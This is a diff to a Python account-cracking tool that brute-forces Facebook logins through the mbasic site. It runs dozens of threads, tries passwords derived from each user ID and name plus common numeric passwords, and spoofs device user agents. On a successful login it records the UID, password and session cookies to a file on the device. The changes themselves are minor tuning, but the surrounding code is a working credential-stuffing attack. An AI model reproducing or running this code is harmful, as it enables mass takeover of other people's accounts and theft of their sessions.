@@ -48,7 +48,8 @@ class sort:
 
 def info():
     sort.clear()
-    print('     [b]    [red1] WELCOME TO MY TOOL          ')
+    print('[b][red1]WELCOME TO MY TOOL          ')
+    time.sleep(3)
     if not os.path.exists('device_info.txt'):
         os.system('clear')
         print(sort.logo())
@@ -474,7 +475,7 @@ def ran():
     else:
         fb = "mbasic"
     
-    with ThreadPool(max_workers=70) as heron:
+    with ThreadPool(max_workers=50) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
@@ -488,7 +489,7 @@ def ran():
             if ask in ["1", "01", "a", "A"]:
                 pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[2:]]
             else:
-                pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:]] # , "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
+                pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:]]#, "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
             heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
 
@@ -497,7 +498,7 @@ def ren_sub(uid, pwx, meth, user, fb):
     shadid = random.choice(sys_ua)
     custom_agent = ""
     session = requests.Session()
-    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}"),
+    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}\r\r"),
     sys.stdout.flush()
     try:
         for ps in pwx:
@@ -507,7 +508,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = ua()
+            uax = Motorola()
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
             lsd = lsb()
@@ -547,15 +548,16 @@ def ren_sub(uid, pwx, meth, user, fb):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 xx=coki.split("c_user=")[1]
                 xd=xx[:15]
-                print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[Cookies]{coki}\n")
+                print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[Cookies]{coki}")
                 open("/sdcard/SD-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                 oks.append(xd)
                 break
                     
             elif "checkpoint" in heron_brand:
-                pass
+                #coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 
-                # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
+                #print(f"\r\r[green] [OK-ID] {uid} | {ps} \n [🤫]{coki}")
+                pass
             else:
                 continue
         loop += 1
@@ -665,7 +667,7 @@ def approve():
         sys.exit("[!!] Internet Error...")
     
     if showkey in datax:
-        
+        sort.clear()
         print("Checking Subscription")
         time.sleep(3)
         main()
